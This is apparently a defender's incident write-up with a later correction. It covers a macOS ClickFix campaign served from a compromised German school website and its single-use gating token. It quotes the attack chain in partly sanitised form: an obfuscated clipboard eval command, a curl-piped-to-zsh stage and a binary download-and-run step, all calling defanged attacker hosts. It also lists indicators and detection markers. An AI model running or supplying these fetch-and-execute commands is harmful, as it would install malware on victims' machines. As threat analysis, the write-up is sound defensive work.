# One Shot: What a Single-Use Gate Actually Protects

## What a single-use gate does to incident response — and why the page source could not tell this case apart from a legitimate one

> **Corrected 2026-08-06.** This note was first published as *"a ClickFix Chain That
> Cannot Be Analysed Twice"*. Two days later the chain was recovered end to end, and
> that claim did not survive. The mechanism described below was real and correctly
> observed; the conclusion drawn from it was too strong. See section 8.

*First documentation, August 2026*

---

## TL;DR

A German primary school's website served a fake Cloudflare "human verification" overlay
instructing visitors to press `⌘+Space → Terminal → ⌘+V → Enter`. On page load,
JavaScript had already written a command into the clipboard. Pasting it fetches a second
stage and pipes it straight into `zsh` — nothing touches disk, and the victim executes it
under their own account, so Gatekeeper, XProtect and download filters never get a vote.

The interesting part is not the technique, which is well documented. It is the **gate**:
the first stage checks in with a control server using a per-victim token, and that token
is honoured **exactly once**. That single design choice reorders the whole investigation —
not because it makes analysis impossible, but because it puts a clock on it. Section 8
records how that distinction was learned the hard way.

This note is the operational companion to [the Ad-Shield case](../2026-08-ad-shield-welt-de/),
which reached the opposite conclusion from evidence that looked much the same. Read
together, they are the actual argument.

---

## 1. The chain

**Stage 0 — the clipboard.** 477 bytes, written on page load:

```sh
_7dcf=<hex>;eval "$(printf '%s' '<base64>'|base64 -d)"
```

**Stage 1 — after one decode:**

```sh
_xr=$(curl -s 'hxxp://enter-pverif-code[.]info/p/<per-victim-token>')
if [ "$_xr" = "ok" ]; then
    curl -s $(echo "<base64>" | openssl base64 -d -A) | zsh
fi
```

**Stage 2 — from the inner layer:**

```
hxxps://ferncurrent14[.]com/curl/<campaign-token>
```

**Stage 3 — recovered 2026-08-06** (see section 8). Stage 2 fires a telemetry beacon the
moment the victim pastes, then fetches a universal Mach-O:

```
POST hxxps://grove-89[.]com/api/metrics/run?event=pasted     headers: user, BuildID
     hxxps://ferncurrent14[.]com/<id>/DANTE/update  ->  /tmp/helper
     xattr -c ; chmod +x ; run
```

Three details worth keeping:

- Stage 1 runs over **plain HTTP**; stage 2 is HTTPS. The gate check is readable on the
  wire, which is a gift to network detection and a curious choice by the operator.
- The inner layer uses `openssl base64 -d -A`, not `base64 -d`. Same result, different
  string — enough to slip a naive clipboard or shell-history signature keyed on the
  obvious form.
- Throwaway variable prefixes (`_7dcf`, `_xr`) change per campaign but are stable within
  one, which makes them decent hunting material and poor blocking material.

---

## 2. The gate, and what it costs you

The control server answers `ok` once per token. A second request returns nothing, and the
`if` never fires.

For the operator this buys clean per-click telemetry and defeats sandbox re-execution. For
anyone investigating, it means:

- **A spent token stays spent.** By the time the clipboard content is in front of you, it
  may already be burnt — by the victim, or by your own first look. Nothing brings that
  particular token back.
- **A captured one-liner is not transferable.** Handing it to a colleague, or to a
  sandbox, gets nothing. What looks like a reproducible artefact is a single-use ticket.
- **Retrospective analysis is impossible; repeat analysis is not.** This is the
  distinction the first version of this note got wrong. A fresh visit to a live lure
  issues a new token and the chain runs again — see section 8.

The practical consequence is an inversion of the usual order. Normally: observe, form a
hypothesis, then collect what the hypothesis needs. Against a single-use gate: **collect
first, at full fidelity, then think.** Preserve the clipboard content byte-for-byte before
decoding it, before pasting it anywhere, before deciding what it is.

That sounds obvious written down. It is not what happens when a page looks broken and the
first instinct is to poke at it.

---

## 3. The window, measured

On 2026-08-04 a public feed carried a batch of 29 apex domains tagged as ClickFix,
submitted at 16:56:50 UTC. One of them was `ferncurrent14[.]com` — the same stage-2 host
seen in this case, which is what tied the batch to it.

Eight of those targets were fetched shortly after 18:08 UTC, download-only. Roughly
**70 minutes** after the public report:

| Target type | Result |
|---|---|
| Attacker-registered hosts (3) | 404 behind Cloudflare, 521 and 522 — origins gone |
| A lure path seen an hour earlier | 404 |
| Compromised legitimate sites (4) | clean original pages, no injection served |

A YARA rule written against the lure page matched **nothing**. A referer bypass with a
macOS Safari user agent changed nothing.

The decisive observation was passive rather than active: the public scanning service's own
screenshots of the same domains, taken at submission time, show the **same clean pages**
and `403 Forbidden` for the attacker-owned hosts. The scanner had been gated out exactly as
we were. An archived DOM would not have helped either — there was nothing in the archive to
begin with.

So the gating is stronger than user-agent or referer filtering. One-shot-per-IP, geo
filtering, or a required redirect chain from malvertising all fit what we saw. Whatever the
mechanism, the operational figure is the one that matters: **for this campaign, a lure is
retrievable inside a window well under an hour — if at all, from a research address.**

---

## 4. The cluster

The 29-domain batch separates cleanly by domain age, and the split matches the roles:

- **Eight domains registered within six days** — the moving parts. Gating hosts, loader
  hosts, throwaway names. Two of them, `enter-pverif-code[.]info` (this case's gate) and
  `makeverizyjar[.]info`, were both zero days old and answered with responses of
  *identical length*. Same role, same age, same size — and, as section 6 shows, the same autonomous system.
  That last point is what lifted it from guess to assessment.
- **Twenty-one established sites**, ages roughly one to ten years, mostly WordPress. These
  are the delivery surface — other people's compromised websites.

One of them, `v-k[.]com[.]ua`, carried a path named `vcapcha.ps1`. A PowerShell file named
after a fake captcha is the Windows arm of the same technique, from the same cluster. Until
then a Windows variant had been "likely but unobserved"; that question is now settled.

**The twenty-one are victims, not infrastructure.** They appear here for context and are
deliberately kept out of the indicator files. Blocking them punishes their users and
creates a delisting problem for people who did nothing wrong. The distinction between
"appears in a campaign" and "belongs to the campaign" is the whole job.

---

## 5. What this note does not establish

- **The payload.** Stage 2 and stage 3 were both recovered on 2026-08-06, but the stealer
  itself was not: stage 3 is a loader whose payload sits encrypted in its own data section
  and is decrypted only in memory. The family assessment — AMOS lineage — rests on chain
  and binary characteristics, and is recorded as *assessed*, not confirmed. The
  machine-readable feeds keep the family field at `unknown`.
- **Attribution.** Nothing here identifies who is behind this. A domain's country code is
  not a location, a location is not a nationality, and rented infrastructure is not
  ownership. The edge-node identifiers in server responses describe the *requester's*
  nearest point of presence, not the target's.

  This applies with full force to the hosting data in section 6. Both gate domains resolve
  to origin IPs in a single autonomous system, and that system carries a Seychelles
  registration while its netblocks carry a Turkish one. Those are registry entries. They
  do not place a server anywhere, and they say nothing at all about who runs the campaign.
  The value of the finding is that a named provider exists to serve legal process on — not
  that a flag can be attached to it.
- **Scale.** How many people saw the overlay, and how many followed it, is answerable only
  from the affected site's server logs. Those sit with the site operator.

---

## 6. Indicators

Full, machine-readable, CC0: [`evidence/iocs.txt`](evidence/iocs.txt).

```
enter-pverif-code.info      stage-1 gate / click telemetry (plain HTTP)
makeverizyjar.info          sibling gate, same hosting AS
ferncurrent14.com           stage-2 and stage-3 loader host
grove-89.com                paste-conversion beacon (added 2026-08-06)
```

`grove-89.com` had no public scan history at all when it was found — it fires before the
payload downloads, which makes it the earliest network signal in the chain.

**The gates are not behind the proxy.** Re-checked on 2026-08-06 against two independent
resolvers: both gate domains use Cloudflare nameservers but DNS-only `A` records, leaving
their origins exposed. Only the stage-2 host is actually proxied.

```
178.16.52.101   enter-pverif-code.info   AS202412
158.94.208.87   makeverizyjar.info       AS202412
188.114.96.3    ferncurrent14.com        AS13335 (Cloudflare) — proxied
```

`AS202412` is *OMEGATECH-AS, Omegatech LTD*, an autonomous system registered 2026-01-12.

That matters twice over. It lifts `makeverizyjar.info` above a coincidence of response
length and registration age — it now shares hosting infrastructure with the confirmed
gate, which is materially stronger, though an AS also hosts unrelated customers. And it
leaves something an investigator can act on: an unproxied origin identifies a provider who
can be served a subscriber-data request, which a Cloudflare-fronted domain does not.

On what this is *not*, see section 5.

**Behavioural markers** — more durable than the domains, which rotate within days:

```
eval "$(printf '%s' '<b64>'|base64 -d)"     outer layer
openssl base64 -d -A                        second decode layer
curl -s … | zsh                             fileless execution
_7dcf / _xr                                 throwaway variable prefixes
```

Detection rules, the decoded chain, the full 29-domain cluster analysis and the capture
tooling live in a separate repository:
**[macos-threat-tracking](https://github.com/raimurokko/macos-threat-tracking)**. The
clipboard sample there carries MD5 `2169ff5e7be77fc3ff72758f9fa50658`, which is the
reference hash registered with two published YARA rules — so the rules can be verified
against the artefact they were written from.

---

## 7. The lesson, and its twin

The methodological point of this note is section 2: **against single-use infrastructure,
collection precedes analysis.** There is no second look, so fidelity at first contact is
the only thing that survives.

But the more uncomfortable point only appears when this case is placed next to the
[Ad-Shield note](../2026-08-ad-shield-welt-de/) in this repository.

There, a major news site served an obfuscated script injected into its HTML, with
attributes set to evade optimisers, contacting a domain that filter lists classify as
adware. Every surface indicator said *compromise*. It was a paid feature, deliberately
integrated by the publisher.

Here, a school website served an obfuscated script injected into its HTML, with markers
and evasion characteristics of the same general shape. Every surface indicator said
*compromise*. This time it was one.

The page source could not tell the two apart. In the first case the answer came from
domain reputation; in the second, from the behaviour of the infrastructure — the gate, the
token, the rotation. In neither case did it come from reading the code more carefully.

Which is worth stating plainly, because the instinct runs the other way: **when injected
third-party code turns up in a page you did not expect it in, more code analysis is rarely
what resolves it.** What resolves it is establishing who the sender is and how their
infrastructure behaves.

---

## 8. Correction (2026-08-06): the payload was recoverable after all

The original argument was that a single-use gate inverts the order of an investigation:
the token burns on first contact, so the payload is gone before you know you wanted it.

Two days later the full chain was recovered — stage 2, stage 3, and the Mach-O.

**The token is single-use. The lure is not.** A second visit to a still-serving lure page
issues a fresh token, and the chain runs again from the top. What the gate prevents is
*retrospective* analysis: you cannot return to a token you have spent, and you cannot hand
a captured one-liner to someone else and expect it to work. Everything is recoverable
going forward; nothing is recoverable backwards.

So the correct statement is not "this cannot be analysed twice" but:

> **The evidence has a shelf life, and remediation shortens it.**

### The uncomfortable part

That deadline runs against the notification work. Every hour spent getting a compromised
site cleaned is an hour closer to losing the sample — and the sample is what decides
whether a notification can name a malware family at all, which is what recipients act on.

The original note treated this as a sequencing problem to be optimised. It is not. It is a
conflict between two duties, and the resolution is not clever ordering but parallelism:
the capture environment has to be standing *before* the first notification goes out, so
the two tracks do not compete for the same window. In this case they did compete, and the
capture happened anyway. That was luck. Designing on the assumption that infrastructure
will outlive the response is a mistake.

### What the sample was worth

- Stage 3 turned out to be a **loader, not the stealer** — sixteen imports, a 69,632-byte
  encrypted blob at entropy 7.997, and `mlock`/`munlock` to keep the decrypted payload out
  of swap. That is an anti-forensics measure aimed at exactly the kind of post-incident
  analysis a defender would attempt, and it was not visible from the scripts.
- A **conversion beacon** appeared in stage 2: a POST fired the moment the victim pastes,
  before anything is downloaded. That is a detection opportunity *ahead* of the
  compromise, and it existed nowhere in the artefacts captured from the first encounter.
- Two non-standard request headers carry campaign and build identifiers.

On that last point the first draft of the technical analysis overreached, and it is worth
recording why: it listed the observed header *values* as indicators, on the reasoning that
they come from the builder and would therefore survive domain rotation. That reasoning is
plausible and completely unevidenced — there is one observation. The published indicators
name the headers; the values stay in the analysis, where a reader can see they were seen
once.

### Revised guidance

1. Treat a single-use gate as a **clock**, not a lock.
2. Have the capture environment ready before notifying anyone, not after.
3. **Do not infer capability from delivery.** From the scripts this looked like a
   straightforward download-and-run. It was a self-decrypting in-memory loader — a
   materially different thing to put in a report.
4. When a claim turns out to be too strong, amend the note rather than quietly dropping
   it. The mechanism here was real and correctly observed. Only the conclusion was wrong.

Full technical detail, including what was independently re-verified against the sample:
[macos-threat-tracking, campaign DANTE](https://github.com/raimurokko/macos-threat-tracking/blob/main/campaigns/2026-08-04-cloudflare-clickfix/payload_analysis.md).

---

## 9. Handling

The affected school was notified the same day, unpaid and without commercial interest, with
remediation steps and a suggested notice for parents. **The site is deliberately not named
here**, and no screenshot of it is published: it is a victim, the operator was given the
information first, and identifying it would serve no defender.

Attacker-controlled indicators are published in full, TLP:CLEAR, because that is what makes
them useful. The two categories are kept apart on purpose — a campaign write-up that names
its victims to look thorough has confused documentation with exposure.

---

*This note documents observations from 2026-08-04 and the days following. The analysis of
the clipboard content was static; nothing was executed. Infrastructure of this kind changes
within days, and several indicators here were already dead when this was written.*
